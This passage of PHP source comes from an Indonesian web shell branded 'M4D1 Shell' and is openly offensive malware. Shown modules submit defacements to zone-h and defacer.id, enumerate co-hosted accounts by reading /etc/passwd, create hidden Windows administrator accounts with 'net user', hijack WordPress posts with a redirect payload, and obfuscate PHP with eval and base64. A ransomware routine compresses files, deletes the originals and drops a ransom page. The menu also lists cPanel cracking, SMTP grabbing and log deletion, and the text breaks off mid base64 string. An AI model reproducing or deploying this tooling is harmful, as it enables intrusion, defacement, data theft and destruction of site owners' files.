    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("inject-code") . '><center>Inject Code</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("db-dump") . '><center>DB Dump</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("cp-crack") . '><center>Cpanel Crack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("smtp-grab") . '><center>SMTP Grabber</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("domains") . '><center>Domains Viewer</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("whmcs-decoder") . '><center>WHMCS Decoder</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("delete-logs") . '><center>Delete Logs</center></a></td>
</tr>
</table>
<br><hr>';
		} elseif (isset($_GET[hex('zone-h')])) {
			?>
				<form action="" method="post">
					<center>
						<hr><br>
						<h2>Zone H Submit M4D1 Shell</h2>
						<u>Defacer :</u>
						<input type="text" name="defacer" style="width: 250px; height: 30px;" value="Your Zone-h Name" class="form-control" />
						<br>
						<u>Attacks Method :</u>
						<select name="hackmode" class="form-control" style="width: 250px; height: 40px;">
							<option>--------SELECT--------</option>
							<option value="1">known vulnerability (i.e. unpatched system)</option>
							<option value="2">undisclosed (new) vulnerability</option>
							<option value="3">configuration / admin. mistake</option>
							<option value="4">brute force attack</option>
							<option value="5">social engineering</option>
							<option value="6">Web Server intrusion</option>
							<option value="7">Web Server external module intrusion</option>
							<option value="8">Mail Server intrusion</option>
							<option value="9">FTP Server intrusion</option>
							<option value="10">SSH Server intrusion</option>
							<option value="11">Telnet Server intrusion</option>
							<option value="12">RPC Server intrusion</option>
							<option value="13">Shares misconfiguration</option>
							<option value="14">Other Server intrusion</option>
							<option value="15">SQL Injection</option>
							<option value="16">URL Poisoning</option>
							<option value="17">File Inclusion</option>
							<option value="18">Other Web Application bug</option>
							<option value="19">Remote administrative panel access bruteforcing</option>
							<option value="20">Remote administrative panel access password guessing</option>
							<option value="21">Remote administrative panel access social engineering</option>
							<option value="22">Attack against administrator(password stealing/sniffing)</option>
							<option value="23">Access credentials through Man In the Middle attack</option>
							<option value="24">Remote service password guessing</option>
							<option value="25">Remote service password bruteforce</option>
							<option value="26">Rerouting after attacking the Firewall</option>
							<option value="27">Rerouting after attacking the Router</option>
							<option value="28">DNS attack through social engineering</option>
							<option value="29">DNS attack through cache poisoning</option>
							<option value="30">Not available</option>
						</select>
						<br>
						<u>Reasons :</u>
						<select name="reason" class="form-control" style="width: 250px; height: 40px;">
							<option style='display:block;width:100%;'>--------SELECT--------</option>
							<option value="1">Heh...just for fun!</option>
							<option value="2">Revenge against that website</option>
							<option value="3">Political reasons</option>
							<option value="4">As a challenge</option>
							<option value="5">I just want to be the best defacer</option>
							<option value="6">Patriotism</option>
							<option value="7">Not available</option>
						</select>
						<br>
						<textarea class="form-control" name="domain" style='display:block;width:25%;height:150px;'>List Of Domains</textarea>
						<p>(1 Domain Per Lines)</p>
						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Send Now !" name="SendNowToZoneH" />
				</form>
				</center>
				<hr><br><span style="color:red">
					<?php
					function ZoneH($url, $hacker, $hackmode, $reson, $site)
					{
						$k = curl_init();
						curl_setopt($k, CURLOPT_URL, $url);
						curl_setopt($k, CURLOPT_POST, true);
						curl_setopt($k, CURLOPT_POSTFIELDS, "defacer=" . $hacker . "&domain1=" . $site . "&hackmode=" . $hackmode . "&reason=" . $reson);
						curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
						curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
						$kubra = curl_exec($k);
						curl_close($k);
						return $kubra;
					}

					if (isset($_POST['SendNowToZoneH'])) {
						ob_start();
						$sub = @get_loaded_extensions();
						if (!in_array("curl", $sub)) {
							die('[-] Curl Is Not Supported !! ');
						}

						$hacker = $_POST['defacer'];
						$method = $_POST['hackmode'];
						$neden = $_POST['reason'];
						$site = $_POST['domain'];

						if ($hacker == "Your Zone-h Name") {
							die("[-] You Must Fill the Attacker name !");
						} elseif ($method == "--------SELECT--------") {
							die("[-] You Must Select The Method !");
						} elseif ($neden == "--------SELECT--------") {
							die("[-] You Must Select The Reason");
						} elseif (empty($site)) {
							die("[-] You Must Inter the Sites List ! ");
						}
						$i = 0;
						$sites = explode("\n", $site);
						while ($i < count($sites)) {
							if (substr($sites[$i], 0, 4) != "http") {
								$sites[$i] = "http://" . $sites[$i];
							}
							ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
							echo "Site : " . $sites[$i] . " Defaced !<br>";
							++$i;
						}
						echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !!";
					}
					?>
				</span>
			<?php
		} elseif (isset($_GET[hex('defacer-id')])) {

			echo "<hr><br><center>
		<h2>Defacer ID Submit M4D1 Shell</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='M4DI~UciH4'><br>
		<u>Team</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='tim' size='50' value='Index Attacker'><br>
		<u>Domains</u>: <br>
		<textarea class = 'form-control' style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input  class = 'form-control' style='width:250px; height:40px; 'type='submit' name='go' value='Submit'>
		</form><hr><br>";
			$site = explode("\r\n", $_POST['sites']);
			$go = $_POST['go'];
			$hekel = $_POST['hekel'];
			$tim = $_POST['tim'];
			if ($go) {
				foreach ($site as $sites) {
					$zh = $sites;
					$form_url = "https://www.defacer.id/notify";
					$data_to_post = array();
					$data_to_post['attacker'] = "$hekel";
					$data_to_post['team'] = "$tim";
					$data_to_post['poc'] = 'SQL Injection';
					$data_to_post['url'] = "$zh";
					$curl = curl_init();
					curl_setopt($curl, CURLOPT_URL, $form_url);
					curl_setopt($curl, CURLOPT_POST, sizeof($data_to_post));
					curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
					curl_setopt($curl, CURLOPT_POSTFIELDS, $data_to_post);
					curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
					$result = curl_exec($curl);
					echo $result;
					curl_close($curl);
					echo "<br>";
				}
			}
		} elseif (isset($_GET[hex('jumping')])) {

			echo "<hr><br><center><h2>Jumping M4D1 Shell</h2>";
			echo "<form method = 'POST' action = ''>";
			echo "<input type = 'submit' name = 'jump' class='form-control' style='width:250px;height:40px;' value = 'Jump!'> ";
			echo "<hr><br></center>";

			if (isset($_POST['jump'])) {

				$i = 0;
				echo "<pre><div class='margin: 5px auto;'>";
				$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
				while ($passwd = fgets($etc)) {
					if ($passwd == '' || !$etc) {
						echo "<font color=red>Can't read /etc/passwd</font>";
					} else {
						preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
						foreach ($user_jumping[1] as $user_Exc_jump) {
							$user_jumping_dir = "/home/$user_Exc_jump/public_html";
							if (is_readable($user_jumping_dir)) {
								$i++;
								$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=blue>$user_jumping_dir</font></a>";
								if (is_writable($user_jumping_dir)) {
									$jrw = "[<font color=red>RW</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
								}
								echo $jrw;
								if (function_exists('posix_getpwuid')) {
									$domain_jump = file_get_contents("/etc/named.conf");
									if ($domain_jump == '') {
										echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
									} else {
										preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
										foreach ($domains_jump[1] as $dj) {
											$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
											$user_jumping_url = $user_jumping_url['name'];
											if ($user_jumping_url == $user_Exc_jump) {
												echo " => ( <u>$dj</u> )<br>";
												break;
											}
										}
									}
								} else {
									echo "<br>";
								}
							}
						}
					}
				}
				if ($i == 0) {
				} else {
					echo "<br>Total ada " . $i . " Kamar di " . gethostbyname($_SERVER['HTTP_HOST']) . "";
				}
				echo "</div></pre>";
			}
		} elseif (isset($_GET[hex('fake-root')])) {

			ob_start();
			if (!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die("I Think this server is not using shared host ");
			function reverse($url)
			{
				$ch = curl_init("http://domains.yougetsignal.com/domains.php");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_POST, 1);
				$resp = curl_exec($ch);
				$resp = str_replace("[", "", str_replace("]", "", str_replace("\"\"", "", str_replace(", ,", ",", str_replace("{", "", str_replace("{", "", str_replace("}", "", str_replace(", ", ",", str_replace(", ", ",",  str_replace("'", "", str_replace("'", "", str_replace(":", ",", str_replace('"', '', $resp)))))))))))));
				$array = explode(",,", $resp);
				unset($array[0]);
				foreach ($array as $lnk) {
					$lnk = "http://$lnk";
					$lnk = str_replace(",", "", $lnk);
					echo $lnk . "\n";
					ob_flush();
					flush();
				}
				curl_close($ch);
			}
			function cek($url)
			{
				$ch = curl_init($url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
				$resp = curl_exec($ch);
				return $resp;
			}
			$cwd = getcwd();
			$ambil_user = explode("/", $cwd);
			$user = $ambil_user[2];
			if ($_POST['reverse']) {
				$site = explode("\r\n", $_POST['url']);
				$file = $_POST['file'];
				foreach ($site as $url) {
					$cek = cek("$url/~$user/$file");
					if (preg_match("/hacked/i", $cek)) {
						echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
					}
				}
			} else {
				echo "<hr><br><center><h2>Fake Root M4D1 Shell</h2><form method='post'>
		Filename: <br><input class='form-control' type='text' name='file' value='deface.html' style='width:300px;height:40px;'><br>
		User: <br><input class='form-control' type='text' value='$user' size='50' height='10' readonly style='width:300px;height:40px;'><br>
		Domain: <br>
		<textarea class='form-control' style='width: 450px; height: 250px;' name='url'>";
				reverse($_SERVER['HTTP_HOST']);
				echo "</textarea><br>
		<input class='form-control' type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
			}
		} elseif (isset($_GET[hex('adminer')])) {

			echo "<hr><br>";
			echo "<center><h2>Adminer M4D1 Shell</h2>";
			echo "<input type='submit' class='form-control' value='Spawn Adminer' style='width:250px;height:40px;' name='do_adminer'></center>";
			echo "<hr><br>";

			if (isset($_POST['do_adminer'])) {

				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				function adminer($url, $isi)
				{
					$fp = fopen($isi, "w");
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_FILE, $fp);
					return curl_exec($ch);
					curl_close($ch);
					fclose($fp);
					ob_flush();
					flush();
				}
				if (file_exists('adminer.php')) {
					echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
				} else {
					if (adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php")) {
						echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
					} else {
						echo "<center><font color=red>gagal buat file adminer</font></center>";
					}
				}
			}
		} elseif (isset($_GET[hex('rdp')])) {
			if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
				if ($_POST['create']) {
					$user = htmlspecialchars($_POST['user']);
					$pass = htmlspecialchars($_POST['pass']);
					if (preg_match("/$user/", exe("net user"))) {
						echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
					} else {
						$add_user   = exe("net user $user $pass /add");
						$add_groups1 = exe("net localgroup Administrators $user /add");
						$add_groups2 = exe("net localgroup Administrator $user /add");
						$add_groups3 = exe("net localgroup Administrateur $user /add");
						echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>" . gethostbyname($_SERVER['HTTP_HOST']) . "</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
						if ($add_user) {
							echo "[add user] -> <font color='lime'>Berhasil</font><br>";
						} else {
							echo "[add user] -> <font color='red'>Gagal</font><br>";
						}
						if ($add_groups1) {
							echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
						} elseif ($add_groups2) {
							echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
						} elseif ($add_groups3) {
							echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
						} else {
							echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
						}
						echo "------------------------------<br>";
					}
				} elseif ($_POST['s_opsi']) {
					$user = htmlspecialchars($_POST['r_user']);
					if ($_POST['opsi'] == '1') {
						$cek = exe("net user $user");
						echo "Checking username <font color=lime>$user</font> ....... ";
						if (preg_match("/$user/", $cek)) {
							echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
						} else {
							echo "[ <font color=red>belum ada</font> ]";
						}
					} elseif ($_POST['opsi'] == '2') {
						$cek = exe("net user $user M4DI~UciH4");
						if (preg_match("/$user/", exe("net user"))) {
							echo "[change password: <font color=lime>M4DI~UciH4</font>] -> ";
							if ($cek) {
								echo "<font color=lime>Berhasil</font>";
							} else {
								echo "<font color=red>Gagal</font>";
							}
						} else {
							echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
						}
					} elseif ($_POST['opsi'] == '3') {
						$cek = exe("net user $user /DELETE");
						if (preg_match("/$user/", exe("net user"))) {
							echo "[remove user: <font color=lime>$user</font>] -> ";
							if ($cek) {
								echo "<font color=lime>Berhasil</font>";
							} else {
								echo "<font color=red>Gagal</font>";
							}
						} else {
							echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
						}
					} else {
						//
					}
				} else {
					echo "<hr><br><center>";
					echo "<h2>RDP M4D1 Shell</h2>";
					echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='M4DI~UciH4' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='M4DI~UciH4' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='submit' name='create' value='Gass'>
            </div>
            </div>
            </form><br>
            -- Option --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='r_user' placeholder='username' required>
            </div>
            <div class = 'col-md-4'>
            <select name='opsi' class ='form-control' style = 'width:250px;height:40px;'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            </div>
            <div class = 'col-md-4'>
            <input type='submit' name='s_opsi' value='Cek' class ='form-control' style = 'width:250px;height:40px;'>
            </div>
            </div>
            </form><hr><br>
            ";
				}
			} else {
				echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
			}
		} elseif (isset($_GET[hex('wp-hijack')])) {

			echo '<form method="POST">
<center><hr><br>			
<img border="0" src="http://www3.0zz0.com/2014/08/20/15/615506358.png">
<h2>Wordpress Hijack Index M4D1 Shell</h2><br>
<center>
<div class = "row clearfix ml-5">
<div class= "col-md-2">
<input class="form-control" type="text" value="localhost" name="pghost">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="database_name" name="dbnmn">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="prefix" name="prefix">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="username_db" name="dbusrrrr">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="password_db" name="pwddbbn"></center><br>
</div>
</div>
<center><textarea class="form-control" name="pown" cols="85" rows="10"><meta http-equiv="refresh" content="0;URL=https://pastebin.com/raw/19vXRn3E"></textarea><br>
<input style="width:250px;height:40px;" class="form-control" type="submit" name="up2" value="Hijack Index"><br></center><form><hr><br>';
			$pghost = $_POST['pghost'];
			$dbnmn = $_POST['dbnmn'];
			$dbusrrrr = $_POST['dbusrrrr'];
			$pwddbbn = $_POST['pwddbbn'];
			$index = stripslashes($_POST['pown']);
			$prefix = $_POST['prefix'];
			//$prefix = "wp_";
			if ($_POST['up2']) {
				@mysql_connect($pghost, $dbusrrrr, $pwddbbn) or die(mysql_error());
				@mysql_select_db($dbnmn) or die(mysql_error());
				$tableName = $prefix . "posts";
				$ghost1 = mysql_query("UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 ");
				if (!$ghost1) {
					$ghost2 = mysql_query("UPDATE $tableName SET post_content ='" . $index . "' WHERE ID > 0 ");
				} elseif (!$ghost2) {
					$ghost3 = mysql_query("UPDATE $tableName SET post_name ='" . $index . "' WHERE ID > 0 ");
				}
				mysql_close();
				if ($ghost1 || $ghost2 || $ghost3) {
					echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";
				} else {
					echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";
				}
			}
		} elseif (isset($_GET[hex('obfuscator')])) {	
?>
<div class="heading">
		<font><center><h1>Obfuscator By M4DI~UciH4</h1></center></font>
		</div>
		<div class="input">
			<form action="" method="POST">
				<textarea rows="9" cols="85" type="text" name="php" placeholder="Input Php Code Here"></textarea><br><br>
				<select name="option">
					<option>Weak Obfuscation</option>
					<option>Medium Level Obfuscation</option>
					<option>Strong Obfuscation</option>
				</select><br><br><br>
				<center><input type="submit" name="submit" value="Submit" /></center><br>
				<?php 

                                    if (isset($_POST['submit'])) {
                                        $phpcode = $_POST['php'];
                                        if (!empty($phpcode)) {
                                            $option = htmlspecialchars($_POST['option']);
                                            $website = "http://" . $_SERVER['HTTP_HOST'];
                                            $file_location = htmlspecialchars($_SERVER['REQUEST_URI']);
                                            $all_in_one = $website . $file_location;
                                            $final = strrev(base64_encode(gzdeflate(gzcompress($phpcode))));
                                            $obfuscated_code = $final;
                                            switch ($option) {
                                                case 'Weak Obfuscation':
                                                    echo '
<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUzQg==";
$Crime = "' . $obfuscated_code . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                                case 'Medium Level Obfuscation':
                                                    $obfuscate_medium_level = strrev(base64_encode(gzdeflate(gzdeflate(gzcompress($phpcode)))));
                                                    echo '<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
$Crime = "' . $obfuscate_medium_level . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                                case 'Strong Obfuscation':
                                                    $obfuscate_high_level = strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($phpcode)))))));
                                                    echo '<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
$Crime = "' . $obfuscate_high_level . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                            }
                                        }
                                    }
                                    ?>
			</form>
		</div>
		<div class="footer">
			<footer>
				<font><center>Developed By<a href="https://www.google.com/search?q=M4DI~UciH4" target="_blank"> M4DI~UciH4</a></center></font>
			</footer>
		</div>
	</body>
</html>
<?php
		} elseif (isset($_GET[hex('zip-menu')])) {

			$dir = path();
			echo "<center>";
			echo "<hr><br>";
			echo "<h2>Zip Menu</h2>";
			function rmdir_recursive($dir)
			{
				foreach (scandir($dir) as $file) {
					if ('.' === $file || '..' === $file) continue;
					if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
					else unlink("$dir/$file");
				}
				rmdir($dir);
			}
			if ($_FILES["zip_file"]["name"]) {
				$filename = $_FILES["zip_file"]["name"];
				$source = $_FILES["zip_file"]["tmp_name"];
				$type = $_FILES["zip_file"]["type"];
				$name = explode(".", $filename);
				$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
				foreach ($accepted_types as $mime_type) {
					if ($mime_type == $type) {
						$okay = true;
						break;
					}
				}
				$continue = strtolower($name[1]) == 'zip' ? true : false;
				if (!$continue) {
					$message = "Itu Bukan Zip  , , GOBLOK COK";
				}
				$path = dirname(__FILE__) . '/';
				$filenoext = basename($filename, '.zip');
				$filenoext = basename($filenoext, '.ZIP');
				$targetdir = $path . $filenoext;
				$targetzip = $path . $filename;
				if (is_dir($targetdir)) rmdir_recursive($targetdir);
				mkdir($targetdir, 0777);
				if (move_uploaded_file($source, $targetzip)) {
					$zip = new ZipArchive();
					$x = $zip->open($targetzip);
					if ($x === true) {
						$zip->extractTo($targetdir);
						$zip->close();
						unlink($targetzip);
					}
					$message = "<b>Sukses Cok :)</b>";
				} else {
					$message = "<b>Error Jancok :(</b>";
				}
			}
			echo '<table style="width:100%" border="1">
<form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" class="form-control" name="zip_file" /></label>
<input type="submit" class="form-control" style="width:250px;" name="submit" value="Upload And Unzip" />
</form><br><br>';
			if ($message) echo "<p>$message</p>";
			echo "<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input class='form-control' type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input class='form-control' type='text' name='save' value='$dir/Exorcism_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
			if ($_POST['backup']) {
				$save = $_POST['save'];
				function Zip($source, $destination)
				{
					if (extension_loaded('zip') === true) {
						if (file_exists($source) === true) {
							$zip = new ZipArchive();
							if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
								$source = realpath($source);
								if (is_dir($source) === true) {
									$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
									foreach ($files as $file) {
										$file = realpath($file);
										if (is_dir($file) === true) {
											$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
										} else if (is_file($file) === true) {
											$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
										}
									}
								} else if (is_file($source) === true) {
									$zip->addFromString(basename($source), file_get_contents($source));
								}
							}
							return $zip->close();
						}
					}
					return false;
				}
				Zip($_POST['dir'], $save);
				echo "Selesai , Save To <b>$save</b>";
			}
			echo "
        <h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input class='form-control' type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/Exorcism_unzip' style='width: 450px;' height='10'><br><br>
    <input class='form-control' type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    ";
			if ($_POST['extrak']) {
				$save = $_POST['save'];
				$zip = new ZipArchive;
				$res = $zip->open($_POST['dir']);
				if ($res === TRUE) {
					$zip->extractTo($save);
					$zip->close();
					echo 'Succes , Location : <b>' . $save . '</b>';
				} else {
					echo 'Gagal Cok :( Ntahlah !';
				}
			}
			echo '</table><hr>';
		} elseif (isset($_GET[hex('reverse-ip')])) {

			?>
				<br>
				<hr>
				<center>
					<h2>Reverse IP M4D1 Shell</h2>
					<a style="width: 250px;" class="form-control" onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>">[ Reverse IP Lookup ] </a>
				</center>
				<br>
				<hr>
			<?php
			} elseif (isset($_GET[hex('ransomware2')])) {
 error_reporting(0);set_time_limit(0);ini_set('memory_limit','-1');if(isset($_POST['pass'])){function encfile($filename){if(strpos($filename,'.M4DI~UciH4') !== false){return ;}file_put_contents($filename.".M4DI~UciH4",gzdeflate(file_get_contents($filename),9));unlink($filename);copy('.htaccess','.htabackup');$file=base64_decode("PHRpdGxlPllvdXIgV2Vic2l0ZSBIYXMgQmVlbiBMb2NrZWQ8L3RpdGxlPg0KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vZnJlZXBuZ2ltZy5jb20vdGh1bWIvcGFkbG9jay8xMC0yLXBhZGxvY2staGlnaC1xdWFsaXR5LXBuZy5wbmciPg0KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUFsYWRpbicgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSJodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1GcmVkZXJpY2thK3RoZStHcmVhdCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQo8bGluayBocmVmPSdodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1PcmJpdHJvbjo3MDAnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPg0KPHN0eWxlPg0KaW5wdXQgeyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgY29sb3I6IHdoaXRlOyBib3JkZXI6IDFweCBzb2xpZCB3aGl0ZTsgfQ0KPC9zdHlsZT4NCjw/cGhwDQplcnJvcl9yZXBvcnRpbmcoMCk7DQokaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsNCiRwYXNzID0gImphbmNva2phcmFuIjsNCmlmKGlzc2V0KCRpbnB1dCkpIHsNCmlmKG1kNSgkaW5wdXQpID09ICRwYXNzKSB7DQpmdW5jdGlvbiBkZWNmaWxlKCRmaWxlbmFtZSl7DQoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcuTTRESX5VY2lINCcpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLk00REl+VWNpSDQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQoJdW5saW5rKCdtNGQxLnBocCcpOw0KCXVubGluaygnLmh0YWNjZXNzJyk7DQoJdW5saW5rKCRmaWxlbmFtZSk7DQoJZWNobyAiJGZpbGVuYW1lIERlY3J5cHRlZCAhISE8YnI+IjsNCn0NCg0KZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0KCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOw0KCQkJfWVsc2Ugew0KCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0KCQl9DQoJfQ0KfQ0KDQpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7